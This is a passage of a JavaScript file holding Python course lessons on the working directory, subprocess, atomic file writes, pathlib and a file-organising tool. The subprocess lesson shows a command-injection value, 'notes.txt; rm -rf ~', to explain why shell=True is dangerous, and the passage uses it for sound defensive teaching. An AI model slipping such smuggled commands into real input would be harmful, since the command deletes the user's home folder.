cwd:  C:\\...\\workspace\\flask\\learn
file: C:\\...\\workspace\\flask\\learn

PS flask> python learn/hello.py
cwd:  C:\\...\\workspace\\flask          <- moved
file: C:\\...\\workspace\\flask\\learn    <- unchanged`],
    ['p', "Same program, two different working directories. That gap is the entire reason for the `BASE_DIR` line at the top of your `hello.py`."],
    ['h', "What it silently affects"],
    ['ul', [
      "`open(\"notes.txt\")` — relative to the cwd.",
      "`os.listdir(\".\")`, `glob.glob(\"*.py\")` — relative to the cwd.",
      "`sqlite3.connect(\"app.db\")` — creates the file wherever you happened to be.",
      "Not `__file__`, and not anything built from it."
    ]],
    ['h', "os.chdir, and why to avoid it"],
    ['code', 'python', `os.chdir("logs")
open("app.log")        # now means logs/app.log`],
    ['warn', "`os.chdir` is **process-global**. It changes the meaning of every relative path everywhere, including inside libraries you did not write and in other threads running at the same time. In a web app, where requests are handled concurrently, one request calling `chdir` can break another mid-flight. Do not use it in a server."],
    ['h', "What to do instead"],
    ['code', 'python', `# instead of: os.chdir(folder); open("data.csv")
open(os.path.join(folder, "data.csv"))

# instead of: os.chdir(repo); subprocess.run(["git", "status"])
subprocess.run(["git", "status"], cwd=repo)`],
    ['p', "Pass the directory explicitly. `subprocess.run` takes `cwd=`, which changes the directory for the child process only and leaves yours alone."],
    ['h', "When you really must"],
    ['code', 'python', `import contextlib, os

# Python 3.11+
with contextlib.chdir(folder):
    ...                          # restored on the way out, even if it raises

# earlier versions
@contextlib.contextmanager
def pushd(folder):
    previous = os.getcwd()
    os.chdir(folder)
    try:
        yield
    finally:
        os.chdir(previous)`],
    ['p', "The `try/finally` is the point: without it, an exception leaves the process in the wrong directory and every later relative path is wrong."],
    ['h', "The rule"],
    ['p', "**Absolute paths built from `__file__` for anything your program owns. The cwd is the user's, not yours.**"]
  ],
  ex: [
    { q: "Print `os.getcwd()` and the `BASE_DIR` expression from `hello.py`, then run it from `learn/` and from its parent.",
      hint: "`python hello.py` vs `python learn/hello.py`.",
      a: "`BASE_DIR` is identical both times; `getcwd()` differs. That is the whole lesson in two lines of output.",
      code: ['python', `import os
print("cwd :", os.getcwd())
print("file:", os.path.dirname(os.path.abspath(__file__)))`] },
    { q: "Which of these depend on the cwd? `open(\"a.txt\")`, `open(os.path.join(BASE_DIR, \"a.txt\"))`, `glob.glob(\"*.py\")`, `Path(__file__).parent`.",
      a: "The first and third. Anything built from `__file__` is anchored to the source file and does not move." },
    { q: "Give a specific reason `os.chdir` is dangerous inside a Flask view.",
      a: "It is process-global. Flask handles requests concurrently, so while one view has chdir'd, another request's relative path resolves somewhere unexpected — a bug that appears only under load and is close to impossible to reproduce by clicking." },
    { q: "Rewrite `os.chdir(repo); subprocess.run([\"git\",\"status\"])` without changing your own directory.",
      hint: "`subprocess.run` takes a keyword for this.",
      a: "`cwd=` sets the directory for the **child** process only. Your own stays put.",
      code: ['python', `subprocess.run(["git", "status"], cwd=repo)`] },
    { q: "Write a `pushd` context manager that restores the previous directory even if the body raises. Why is `finally` essential?",
      a: "Without `finally`, an exception skips the restore and the process is left in the wrong directory — so every later relative path in the whole program is silently wrong, long after the error that caused it.",
      code: ['python', `@contextlib.contextmanager
def pushd(folder):
    previous = os.getcwd()
    os.chdir(folder)
    try:
        yield
    finally:
        os.chdir(previous)`] }
  ],
  quiz: [
    { q: "What is the current working directory?",
      opts: ["Where the script file lives", "Where the process was started from", "The user's home folder", "Python's install folder"], correct: 1,
      why: "It comes from the terminal, not the source file — which is why relative paths move when you launch differently." },
    { q: "Which is unaffected by the cwd?",
      opts: ["`open(\"a.txt\")`", "`glob.glob(\"*.py\")`", "`os.path.abspath(__file__)`", "`os.listdir(\".\")`"], correct: 2,
      why: "__file__ is anchored to the source file. Everything relative resolves against the cwd." },
    { q: "Why avoid `os.chdir` in a web app?",
      opts: ["It is slow", "It is process-global, so it affects concurrent requests", "It needs admin rights", "It only works on Windows"], correct: 1,
      why: "One request changes the meaning of relative paths for every other request in flight." },
    { q: "How do you run a subprocess in another folder without moving yourself?",
      opts: ["os.chdir first", "Pass cwd= to subprocess.run", "Use an absolute command", "You cannot"], correct: 1,
      why: "cwd= applies to the child process only." }
  ],
  fill: [
    { prompt: "Ask where relative paths currently resolve.", lang: 'python',
      code: 'here = os.___()', opts: ["getpwd", "getcwd", "curdir", "path"], correct: 1,
      why: "Where the process was started, not where the file lives." },
    { prompt: "Run a command elsewhere without moving yourself.", lang: 'python',
      code: 'subprocess.run(["git", "status"], ___=repo)', opts: ["dir", "cwd", "path", "folder"], correct: 1,
      why: "It sets the directory for the child process only." },
    { prompt: "Guarantee the directory is restored even on an error.", lang: 'python',
      code: 'try:\n    yield\n___:\n    os.chdir(previous)', opts: ["except", "else", "finally", "end"], correct: 2,
      why: "finally runs on both the normal and the exceptional path." }
  ]
};

LESSON_CONTENT_2["os:10"] = {
  blocks: [
    ['p', "Sooner or later a Python script needs to run something that is not Python — git, ffmpeg, another script. There is a right way and a way that has caused decades of security incidents."],
    ['h', "subprocess.run, with a list"],
    ['code', 'python', `import subprocess

result = subprocess.run(
    ["git", "status", "--short"],
    capture_output=True,
    text=True,
)

print(result.returncode)     # 0 means success
print(result.stdout)
print(result.stderr)`],
    ['tbl',
      ["Argument", "Does"],
      [
        ["`capture_output=True`", "collects stdout and stderr instead of printing them"],
        ["`text=True`", "decodes to `str` rather than handing you `bytes`"],
        ["`check=True`", "raises `CalledProcessError` on a non-zero exit"],
        ["`timeout=10`", "raises `TimeoutExpired` rather than hanging forever"],
        ["`cwd=path`", "runs it in that folder, without moving yours"],
        ["`env={...}`", "replaces the child's environment"]
      ]
    ],
    ['h', "Exit codes"],
    ['code', 'python', `result = subprocess.run(["git", "status"], capture_output=True, text=True)
if result.returncode != 0:
    print("git failed:", result.stderr)

# or let it raise
try:
    subprocess.run(["git", "status"], check=True, capture_output=True, text=True)
except subprocess.CalledProcessError as exc:
    print("exit", exc.returncode, exc.stderr)`],
    ['p', "`0` means success and anything else means failure — the reverse of Python's truthiness, which catches people out."],
    ['h', "Why not shell=True"],
    ['code', 'python', `# the whole string is handed to the shell to interpret
name = input("file name: ")
subprocess.run(f"cat {name}", shell=True)`],
    ['code', 'text', `name = notes.txt              ->  prints the file
name = notes.txt; rm -rf ~    ->  prints the file, then deletes your home folder`],
    ['warn', "With `shell=True` the string is parsed by the shell, so `;`, `&&`, `|`, backticks and `$()` all become operators. Any value you interpolate can end your command and start another. This is **command injection**, and it is the same class of bug as SQL injection."],
    ['code', 'python', `subprocess.run(["cat", name])     # name is one argument, whatever it contains`],
    ['p', "With a list there is no shell and no parsing. `\"notes.txt; rm -rf ~\"` is simply a filename that does not exist."],
    ['h', "os.system is the old way"],
    ['code', 'python', `os.system("git status")     # always shell, no output capture, only an exit code`],
    ['p', "It gives you no stdout, no stderr, no timeout, and always uses a shell. It is fine for a throwaway line in your own terminal and wrong in anything you keep."],
    ['h', "Streaming a long-running command"],
    ['code', 'python', `with subprocess.Popen(
    ["ping", "-n", "4", "127.0.0.1"],
    stdout=subprocess.PIPE, text=True,
) as proc:
    for line in proc.stdout:
        print("|", line.rstrip())`],
    ['p', "`run` waits for the command to finish before giving you anything. `Popen` hands you the output as it arrives, which is what you want for progress."],
    ['h', "Running Python itself"],
    ['code', 'python', `import sys
subprocess.run([sys.executable, "script.py"], check=True)`],
    ['p', "`sys.executable` is the interpreter currently running — the right one even inside a virtual environment. Hardcoding `\"python\"` finds whatever is first on `PATH`, which may be a different version entirely. This is exactly what the course's own `/api/run` endpoint does."]
  ],
  ex: [
    { q: "Run `git status --short` and print the exit code, stdout and stderr separately.",
      a: "Try it in a folder that is not a repository too — you will get a non-zero code and a message on stderr, not stdout.",
      code: ['python', `r = subprocess.run(["git", "status", "--short"], capture_output=True, text=True)
print(r.returncode, repr(r.stdout), repr(r.stderr))`] },
    { q: "Drop `text=True`. What type is `stdout`, and what breaks?",
      a: "`bytes`. `\"error\" in result.stdout` raises `TypeError`, and printing shows the `b'...'` prefix. Either pass `text=True` or decode explicitly." },
    { q: "Explain precisely what `shell=True` does to `f\"cat {name}\"` when `name` is `\"a.txt; rm -rf ~\"`.",
      a: "The shell parses the whole string and treats `;` as a command separator, so it runs two commands: `cat a.txt`, then `rm -rf ~`. With a list and no shell, the same value is one argument — a filename containing odd characters, which simply does not exist." },
    { q: "Run a command that fails, once with `check=True` and once without. When is each better?",
      a: "`check=True` raises `CalledProcessError`, which suits a script that should stop. Without it you inspect `returncode` yourself, which suits a loop that must keep going and report at the end.",
      code: ['python', `try:
    subprocess.run(["git", "nonsense"], check=True, capture_output=True, text=True)
except subprocess.CalledProcessError as exc:
    print("failed:", exc.returncode)`] },
    { q: "Why `[sys.executable, \"script.py\"]` rather than `[\"python\", \"script.py\"]`?",
      a: "`sys.executable` is the interpreter running right now, including inside a virtual environment. `\"python\"` is resolved through `PATH`, which may find a different version, a different venv, or on Windows the Store stub that opens a download page. The course's own Python runner uses `sys.executable` for exactly this reason." }
  ],
  quiz: [
    { q: "What does an exit code of 0 mean?",
      opts: ["Failure", "Success", "Nothing ran", "Still running"], correct: 1,
      why: "Zero is success and non-zero is failure — the opposite of Python truthiness." },
    { q: "Why pass a list rather than a string with shell=True?",
      opts: ["It is faster", "There is no shell to interpret ;, && or | in your data", "Lists are typed", "It captures output"], correct: 1,
      why: "Command injection: an interpolated value can end your command and start another." },
    { q: "Without `text=True`, what is `result.stdout`?",
      opts: ["str", "bytes", "list", "None"], correct: 1,
      why: "You must decode it, or `\"x\" in stdout` raises TypeError." },
    { q: "How should a script launch another Python program?",
      opts: ["`os.system(\"python x.py\")`", "`[\"python\", \"x.py\"]`", "`[sys.executable, \"x.py\"]`", "`exec(open(\"x.py\").read())`"], correct: 2,
      why: "sys.executable is the interpreter you are running under, virtual environment included." }
  ],
  fill: [
    { prompt: "Get the output as text rather than bytes.", lang: 'python',
      code: 'subprocess.run(cmd, capture_output=True, ___=True)', opts: ["decode", "text", "string", "utf8"], correct: 1,
      why: "Otherwise stdout and stderr are bytes." },
    { prompt: "Raise instead of returning a failure quietly.", lang: 'python',
      code: 'subprocess.run(cmd, ___=True)', opts: ["strict", "check", "raise_on_error", "fail"], correct: 1,
      why: "check=True raises CalledProcessError on a non-zero exit code." },
    { prompt: "Launch the same interpreter you are running under.", lang: 'python',
      code: 'subprocess.run([sys.___, "script.py"])', opts: ["path", "executable", "interpreter", "python"], correct: 1,
      why: "Correct inside a virtual environment; \"python\" from PATH may not be." }
  ]
};

LESSON_CONTENT_2["os:11"] = {
  blocks: [
    ['p', "Your `os.txt` explains `\"a\"` versus `\"w\"` well. This lesson is the next layer: how to write a file so that a crash, a full disk or a second copy of your program cannot leave you with garbage."],
    ['h', "The problem with writing in place"],
    ['code', 'python', `with open("settings.json", "w", encoding="utf-8") as f:
    f.write(json.dumps(settings))`],
    ['p', "`\"w\"` truncates the file the instant it opens — before a single byte of new content is written. Between that moment and the end of the write, the file on disk is neither the old version nor the new one."],
    ['code', 'text', `t=0   settings.json  {"theme": "dark", "port": 5000}
t=1   open(..., "w")   -> file is now empty
t=2   ...crash...
t=3   settings.json  (empty — the old content is gone)`],
    ['h', "Write elsewhere, then swap"],
    ['code', 'python', `import os

def write_atomic(path, text, encoding="utf-8"):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding=encoding) as f:
        f.write(text)
        f.flush()
        os.fsync(f.fileno())      # force it to the physical disk
    os.replace(tmp, path)         # atomic swap`],
    ['p', "A rename within one filesystem is a single directory-entry update: it either happened or it did not. No reader ever observes a partial file."],
    ['note', "`flush()` empties Python's buffer into the OS; `os.fsync` tells the OS to write it to the actual disk. Without fsync a power cut can leave the rename done but the contents not yet stored. For a config file that is usually acceptable; for anything you would be upset to lose, keep it."],
    ['h', "tempfile, for names nobody else will take"],
    ['code', 'python', `import tempfile

# a file that deletes itself
with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=True) as f:
    f.write("scratch")
    print(f.name)

# a file you control, created safely
fd, path = tempfile.mkstemp(suffix=".py", dir=SCRATCH_DIR, text=True)
with os.fdopen(fd, "w", encoding="utf-8") as f:
    f.write(code)

# a whole directory that cleans itself up
with tempfile.TemporaryDirectory() as folder:
    ...`],
    ['warn', "Never invent your own temp name like `\"tmp_\" + str(os.getpid())`. Two processes can collide, and a predictable name in a shared folder can be pre-created by someone else as a symlink pointing at a file you did not mean to write. `mkstemp` creates the file atomically with exclusive permissions and hands you the descriptor."],
    ['h', "Always name the encoding"],
    ['code', 'python', `open(path, "w")                        # Windows: cp1255 — mangles Hebrew
open(path, "w", encoding="utf-8")      # the same everywhere`],
    ['p', "Without `encoding=`, Python uses the platform default — which on your machine is not UTF-8. Text that round-trips perfectly on Linux arrives corrupted here. Pass it every single time."],
    ['h', "Appending from more than one writer"],
    ['p', "Your logging pattern — open in `\"a\"`, write one short line, close — is safe in practice: append mode seeks to the end on every write, and short writes are not usually interleaved. It stops being safe for long lines or high volume, which is where the `logging` module (with proper handlers and rotation) takes over."],
    ['h', "Cleaning up after yourself"],
    ['code', 'python', `tmp = path + ".tmp"
try:
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(text)
    os.replace(tmp, path)
finally:
    if os.path.exists(tmp):
        os.remove(tmp)           # only reached if replace never happened`]
  ],
  ex: [
    { q: "Write a file, then rewrite it with `\"w\"` and interrupt with Ctrl+C mid-write (use a big string and a sleep). What is left on disk?",
      hint: "`\"w\"` truncates on open.",
      a: "A truncated or empty file — the original content is unrecoverable. That is the failure the atomic pattern exists to prevent." },
    { q: "Implement `write_atomic(path, text)` and explain why the rename is safe but the write is not.",
      a: "The write takes time and can be interrupted at any point. The rename is a single filesystem operation on one directory entry, so it either completes or does not happen at all — there is no in-between state for a reader to see.",
      code: ['python', `def write_atomic(path, text):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(text)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)`] },
    { q: "What is the difference between `f.flush()` and `os.fsync(f.fileno())`?",
      a: "`flush` moves bytes from Python's buffer into the operating system. `fsync` tells the OS to commit them to the physical disk. After `flush` alone, a crash of your process is survivable but a power cut is not." },
    { q: "Why is `mkstemp` better than building `\"tmp_\" + str(os.getpid())` yourself?",
      hint: "Two things: collisions and something worse.",
      a: "It creates the file atomically with exclusive permissions and a name nobody can predict. A predictable name in a shared directory can be pre-created by someone else — as a symlink to a file you did not intend to overwrite — and your program then writes through it." },
    { q: "Open a file for writing with no `encoding=` on Windows and write `\"שלום\"`. What happens, and what is the fix?",
      a: "It raises `UnicodeEncodeError`, because the default codepage cannot represent those characters. Passing `encoding=\"utf-8\"` fixes it and makes the file identical on every platform. This is the same bug that mangled tracebacks in this course's own Python runner." }
  ],
  quiz: [
    { q: "When does `open(path, \"w\")` empty the file?",
      opts: ["When you call write", "The moment it opens", "When it closes", "Only if it succeeds"], correct: 1,
      why: "Which is why a crash mid-write destroys the old content without producing new content." },
    { q: "Why does the temp-then-rename pattern work?",
      opts: ["Renaming is faster", "A rename in one filesystem is atomic — no reader sees a half state", "It compresses", "It skips the cache"], correct: 1,
      why: "Either the old file or the new one is visible, never a partial one." },
    { q: "What does `os.fsync` add over `flush`?",
      opts: ["Nothing", "It commits the bytes to the physical disk, not just the OS buffer", "It closes the file", "It sets permissions"], correct: 1,
      why: "flush survives a process crash; fsync is what survives a power cut." },
    { q: "Why pass `encoding=\"utf-8\"` explicitly?",
      opts: ["It is faster", "The platform default is not UTF-8 on Windows, so non-ASCII text corrupts or raises", "It is required by open()", "It enables append mode"], correct: 1,
      why: "The same code then behaves identically on every machine." }
  ],
  fill: [
    { prompt: "Swap the finished file into place atomically.", lang: 'python',
      code: 'os.___(tmp, path)', opts: ["rename", "replace", "move", "link"], correct: 1,
      why: "replace overwrites consistently on Windows and POSIX; rename does not." },
    { prompt: "Create a temp file safely, with a name nobody can predict.", lang: 'python',
      code: 'fd, path = tempfile.___(suffix=".py")', opts: ["mktemp", "mkstemp", "tempname", "NamedTemp"], correct: 1,
      why: "mkstemp creates it atomically and returns an open descriptor. mktemp only invents a name — it is deprecated for this reason." },
    { prompt: "Make the file identical on every platform.", lang: 'python',
      code: 'open(path, "w", ___="utf-8")', opts: ["charset", "encoding", "codec", "format"], correct: 1,
      why: "Without it Python uses the platform default, which is not UTF-8 on Windows." }
  ]
};

LESSON_CONTENT_2["os:12"] = {
  blocks: [
    ['p', "Everything you have learned still applies — `pathlib` is the same ideas with better ergonomics. Paths become objects that know what they are, instead of strings you keep passing to functions."],
    ['h', "The / operator"],
    ['code', 'python', `from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
LOG_FILE = BASE_DIR / "logs" / "app.log"`],
    ['p', "Compare with what you have now — same result, four fewer function calls:"],
    ['code', 'python', `BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "logs", "app.log")`],
    ['h', "The translation table"],
    ['tbl',
      ["os.path", "pathlib"],
      [
        ["`os.path.join(a, b)`", "`Path(a) / b`"],
        ["`os.path.dirname(p)`", "`p.parent`"],
        ["`os.path.basename(p)`", "`p.name`"],
        ["`os.path.splitext(p)[0]`", "`p.stem`"],
        ["`os.path.splitext(p)[1]`", "`p.suffix`"],
        ["`os.path.abspath(p)`", "`p.resolve()`"],
        ["`os.path.exists(p)`", "`p.exists()`"],
        ["`os.path.isfile(p)`", "`p.is_file()`"],
        ["`os.makedirs(p, exist_ok=True)`", "`p.mkdir(parents=True, exist_ok=True)`"],
        ["`os.remove(p)`", "`p.unlink()`"],
        ["`os.listdir(p)`", "`p.iterdir()` — yields **paths**"],
        ["`glob.glob(\"*.py\")`", "`p.glob(\"*.py\")`"],
        ["`glob.glob(\"**/*.py\", recursive=True)`", "`p.rglob(\"*.py\")`"]
      ]
    ],
    ['note', "`iterdir()` yields full `Path` objects, not bare names — so the single most common `os.listdir` bug simply cannot happen."],
    ['h', "Reading and writing in one line"],
    ['code', 'python', `LOG_FILE.write_text("hello\\n", encoding="utf-8")
text = LOG_FILE.read_text(encoding="utf-8")

data = SOME_FILE.read_bytes()`],
    ['warn', "There is no `append_text`. For appending you still open the file — which is what your `/about` route does:"],
    ['code', 'python', `with LOG_FILE.open("a", encoding="utf-8") as f:
    f.write("returned the about\\n")`],
    ['h', "Your hello.py, translated"],
    ['code', 'python', `from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
LOG_DIR = BASE_DIR / "logs"
LOG_FILE = LOG_DIR / "app.log"

@app.route("/about")
def about():
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write("returned the about\\n")
    return "They not really care about us"`],
    ['h', "It works everywhere a string does"],
    ['p', "`open()`, `os.makedirs`, `shutil.copy`, `sqlite3.connect`, `subprocess.run(cwd=...)` and essentially every standard-library function accept a `Path`. You can adopt it gradually — no big rewrite needed."],
    ['h', "What still needs os"],
    ['ul', [
      "`os.environ` — environment variables.",
      "`os.walk` when you need to prune branches (`rglob` gives you no way to skip a folder).",
      "`os.replace` for atomic swaps — `Path` has no equivalent.",
      "`shutil` for copying trees and recursive deletion.",
      "`os.getcwd` / `os.chdir` — though `Path.cwd()` exists."
    ]],
    ['h', "A gotcha worth knowing"],
    ['code', 'python', `p = Path("logs/app.log")
p + ".bak"                    # TypeError — Path has no +
p.with_suffix(".bak")         # logs/app.bak
Path(str(p) + ".bak")         # logs/app.log.bak
p.with_name(p.name + ".bak")  # logs/app.log.bak`],
    ['p', "`with_suffix` **replaces** the extension rather than appending to it — the usual first surprise."]
  ],
  ex: [
    { q: "Rewrite the three-line anchor block in `hello.py` using `pathlib`, keeping the same names.",
      a: "Everything downstream keeps working, because `open()` and `os.makedirs` both accept a `Path`.",
      code: ['python', `from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
LOG_DIR = BASE_DIR / "logs"
LOG_FILE = LOG_DIR / "app.log"`] },
    { q: "For `p = Path(\"reports/2026/summary.tar.gz\")`, give `p.parent`, `p.name`, `p.stem` and `p.suffix`.",
      a: "`reports/2026`, `summary.tar.gz`, `summary.tar`, `.gz`. Note `stem` and `suffix` split at the **last** dot, exactly like `os.path.splitext`. For all the suffixes use `p.suffixes` → `['.tar', '.gz']`." },
    { q: "List every `.py` file under your project with `rglob`, then say when you would still need `os.walk`.",
      a: "`rglob` is shorter, but gives no way to stop descending into a folder. The moment you need to skip `node_modules` or `.git`, you need `os.walk` and its in-place `dirnames[:]` pruning.",
      code: ['python', `for p in Path(BASE_DIR).rglob("*.py"):
    print(p, p.stat().st_size)`] },
    { q: "Convert `logs/app.log` into `logs/app.log.bak` — and explain why `with_suffix` is wrong here.",
      hint: "`with_suffix` replaces.",
      a: "`with_suffix(\".bak\")` gives `logs/app.bak`, losing `.log`. To append you need `with_name`.",
      code: ['python', `p.with_name(p.name + ".bak")     # logs/app.log.bak`] },
    { q: "Why does `pathlib` remove the most common `os.listdir` bug entirely?",
      a: "`os.listdir` returns bare names, so calling `getsize(name)` looks in the current working directory and raises `FileNotFoundError`. `Path.iterdir()` yields complete `Path` objects that already include the folder, so there is nothing to rejoin and nothing to forget." }
  ],
  quiz: [
    { q: "What does `Path(\"a\") / \"b\"` do?",
      opts: ["Divides", "Joins the path segments", "TypeError", "Creates the folder"], correct: 1,
      why: "Path overloads / for joining, with the right separator per platform." },
    { q: "What does `p.iterdir()` yield?",
      opts: ["Bare names", "Full Path objects", "Strings with a trailing slash", "File handles"], correct: 1,
      why: "Which is why the classic os.listdir join bug cannot happen with pathlib." },
    { q: "`Path(\"logs/app.log\").with_suffix(\".bak\")` gives…",
      opts: ["logs/app.log.bak", "logs/app.bak", "TypeError", "logs/.bak"], correct: 1,
      why: "with_suffix replaces the extension. To append, use with_name." },
    { q: "Which still needs the os module?",
      opts: ["Joining paths", "Checking a file exists", "os.environ and atomic os.replace", "Reading a text file"], correct: 2,
      why: "Environment variables, walk-with-pruning, atomic replace and shutil have no Path equivalent." }
  ],
  fill: [
    { prompt: "Anchor to the folder holding this file.", lang: 'python',
      code: 'BASE_DIR = Path(__file__).___().parent', opts: ["absolute", "resolve", "expand", "real"], correct: 1,
      why: "resolve() covers abspath plus symlink resolution." },
    { prompt: "Create a folder and any missing parents.", lang: 'python',
      code: 'LOG_DIR.mkdir(___=True, exist_ok=True)', opts: ["recursive", "parents", "force", "deep"], correct: 1,
      why: "parents=True is pathlib's equivalent of makedirs." },
    { prompt: "Find every .py file at any depth.", lang: 'python',
      code: 'for p in root.___("*.py"):', opts: ["glob", "rglob", "walk", "iterdir"], correct: 1,
      why: "rglob recurses; glob stays in one folder unless you write **/." }
  ]
};

LESSON_CONTENT_2["os:13"] = {
  blocks: [
    ['p', "Everything on this track, assembled into a tool you would genuinely run: point it at a messy folder and it sorts files into subfolders by type, safely and reversibly."],
    ['h', "The rules it will follow"],
    ['ul', [
      "**Plan first, act second** — decide every move before performing any.",
      "**Dry run by default** — destruction is opt-in.",
      "**Never overwrite** — a collision gets a numbered name.",
      "**Log every action** — so an undo is possible.",
      "**Keep going on failure** — one locked file must not abort the run."
    ]],
    ['h', "Step 1 — classify"],
    ['code', 'python', `import os

CATEGORIES = {
    "images":    {".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"},
    "documents": {".pdf", ".docx", ".txt", ".md", ".odt"},
    "code":      {".py", ".js", ".css", ".html", ".json"},
    "archives":  {".zip", ".tar", ".gz", ".7z", ".rar"},
    "audio":     {".mp3", ".wav", ".flac", ".m4a"},
    "video":     {".mp4", ".mkv", ".mov", ".avi"},
}

def category_of(name):
    ext = os.path.splitext(name)[1].lower()
    for folder, extensions in CATEGORIES.items():
        if ext in extensions:
            return folder
    return "other"`],
    ['h', "Step 2 — plan"],
    ['code', 'python', `def plan_moves(folder):
    """Return [(src, dst)] without touching anything."""
    moves = []
    taken = set()

    for name in sorted(os.listdir(folder)):
        src = os.path.join(folder, name)
        if not os.path.isfile(src) or name.startswith("."):
            continue

        target_dir = os.path.join(folder, category_of(name))
        dst = unique_path(os.path.join(target_dir, name), taken)
        taken.add(dst)
        moves.append((src, dst))

    return moves


def unique_path(path, taken):
    """Append -2, -3 ... until the name is free on disk and in this plan."""
    if path not in taken and not os.path.exists(path):
        return path
    root, ext = os.path.splitext(path)
    n = 2
    while True:
        candidate = f"{root}-{n}{ext}"
        if candidate not in taken and not os.path.exists(candidate):
            return candidate
        n += 1`],
    ['note', "`taken` matters: two files can plan to become the same name in the same run, and neither exists on disk yet. Checking only `os.path.exists` would let the second overwrite the first."],
    ['h', "Step 3 — perform"],
    ['code', 'python', `import shutil, datetime

def organise(folder, dry_run=True):
    folder = os.path.abspath(folder)
    moves = plan_moves(folder)

    if not moves:
        print("nothing to do")
        return

    log_path = os.path.join(folder, "organise-log.txt")
    stamp = datetime.datetime.now().isoformat(timespec="seconds")
    moved = failed = 0

    with open(log_path, "a", encoding="utf-8") as log:
        log.write(f"# {stamp} dry_run={dry_run}\\n")

        for src, dst in moves:
            if dry_run:
                print("would move", os.path.basename(src), "->", os.path.relpath(dst, folder))
                continue
            try:
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.move(src, dst)
                log.write(f"{src}\\t{dst}\\n")
                moved += 1
            except OSError as exc:
                print("could not move", src, "-", exc)
                failed += 1

    print(f"{len(moves)} planned, {moved} moved, {failed} failed")`],
    ['h', "Step 4 — undo"],
    ['p', "Because every move was logged as a tab-separated pair, reversing it is a few lines — which is the real payoff of logging:"],
    ['code', 'python', `def undo(folder):
    log_path = os.path.join(folder, "organise-log.txt")
    with open(log_path, encoding="utf-8") as log:
        lines = [l for l in log if not l.startswith("#")]

    for line in reversed(lines):
        src, dst = line.rstrip("\\n").split("\\t")
        if os.path.exists(dst):
            shutil.move(dst, src)`],
    ['h', "Step 5 — a command line"],
    ['code', 'python', `import argparse

parser = argparse.ArgumentParser(description="Sort a folder by file type.")
parser.add_argument("folder")
parser.add_argument("--apply", action="store_true", help="actually move files")
parser.add_argument("--undo", action="store_true", help="reverse the last run")
args = parser.parse_args()

if args.undo:
    undo(args.folder)
else:
    organise(args.folder, dry_run=not args.apply)`],
    ['code', 'shell', `python organise.py Downloads            # shows the plan
python organise.py Downloads --apply    # does it
python organise.py Downloads --undo     # puts it back`],
    ['p', "`--apply` rather than `--dry-run` is deliberate: the safe behaviour is what you get when you forget a flag."],
    ['h', "What this used from the track"],
    ['tbl',
      ["Lesson", "Used for"],
      [
        ["02 paths", "`join`, `splitext`, `basename`, `abspath`"],
        ["05 listing", "`listdir`, and rebuilding the full path"],
        ["06 create/delete", "`makedirs(exist_ok=True)`, dry-run discipline"],
        ["07 checking", "`isfile`, `exists`, and catching rather than pre-checking"],
        ["09 moving", "`shutil.move`, never overwriting"],
        ["11 safe writes", "append mode for the log, explicit encoding"]
      ]
    ]
  ],
  ex: [
    { q: "Implement `category_of(name)` and test it on `.PNG`, `.tar.gz` and a file with no extension.",
      hint: "`splitext` splits at the last dot.",
      a: "`.PNG` works because of `.lower()`. `.tar.gz` classifies as an archive by `.gz` alone. No extension gives `\"\"`, which falls through to `other` — all three behave sensibly without special cases." },
    { q: "Write `plan_moves` so it returns pairs without touching the disk. Why plan before acting?",
      a: "You can print the plan, count it, test it and let the user approve it. Deciding and doing in one loop means a bug is discovered only after files have already moved." },
    { q: "Two files in the same run would both become `images/photo.png`. Why is checking `os.path.exists` alone not enough?",
      hint: "When does the first one appear on disk?",
      a: "During a dry run neither exists, and even in a real run the check happens while planning — before any move. Without the `taken` set the second file plans the identical destination and silently overwrites the first." },
    { q: "Add the log and the `undo` function. Why iterate the log in reverse?",
      a: "Moves can chain — a later move may depend on a directory an earlier one created, and a collision-renamed file must go back before the name it displaced is reused. Reversing restores the exact prior state rather than an approximation." },
    { q: "Explain why the flag is `--apply` rather than `--dry-run`.",
      a: "Defaults should fail safe. With `--dry-run`, forgetting the flag moves your files; with `--apply`, forgetting it prints a plan. Destructive behaviour should always require the extra keystroke — the same reasoning as `dry_run=True` being the default parameter." }
  ],
  quiz: [
    { q: "Why build the full list of moves before performing any?",
      opts: ["It is faster", "You can print, count and approve the plan before anything changes", "It uses less memory", "os.listdir requires it"], correct: 1,
      why: "Deciding and acting in one loop means bugs are found after the files have moved." },
    { q: "Why track planned destinations in a `taken` set?",
      opts: ["For speed", "Two files can plan the same destination before either exists on disk", "To sort them", "To count them"], correct: 1,
      why: "os.path.exists cannot see a collision that has not happened yet." },
    { q: "Why is the flag `--apply` rather than `--dry-run`?",
      opts: ["Shorter to type", "Forgetting a flag should be the safe outcome", "argparse requires it", "No reason"], correct: 1,
      why: "Destruction should need the extra keystroke, not safety." },
    { q: "Why replay the log in reverse to undo?",
      opts: ["It is faster", "Moves can depend on each other, so the exact prior state needs the opposite order", "The log is written backwards", "It avoids duplicates"], correct: 1,
      why: "Later moves may rely on folders or freed names from earlier ones." }
  ],
  fill: [
    { prompt: "Classify by extension, case-insensitively.", lang: 'python',
      code: 'ext = os.path.splitext(name)[1].___()', opts: ["strip", "lower", "casefold", "upper"], correct: 1,
      why: "So .PNG and .png land in the same category." },
    { prompt: "Make the destination folder only when actually moving.", lang: 'python',
      code: 'os.makedirs(os.path.dirname(dst), ___=True)', opts: ["parents", "exist_ok", "force", "quiet"], correct: 1,
      why: "Idempotent, so repeated runs are harmless." },
    { prompt: "Move a file that may end up on another drive.", lang: 'python',
      code: '___.move(src, dst)', opts: ["os", "shutil", "pathlib", "glob"], correct: 1,
      why: "shutil.move falls back to copy-then-delete across filesystems; os.rename cannot." }
  ]
};

/* ═══════════════════════════════════════════════════════════
   Completes the CSS track.
   ═══════════════════════════════════════════════════════════ */
LESSON_CONTENT_2["css:6"] = {
  blocks: [
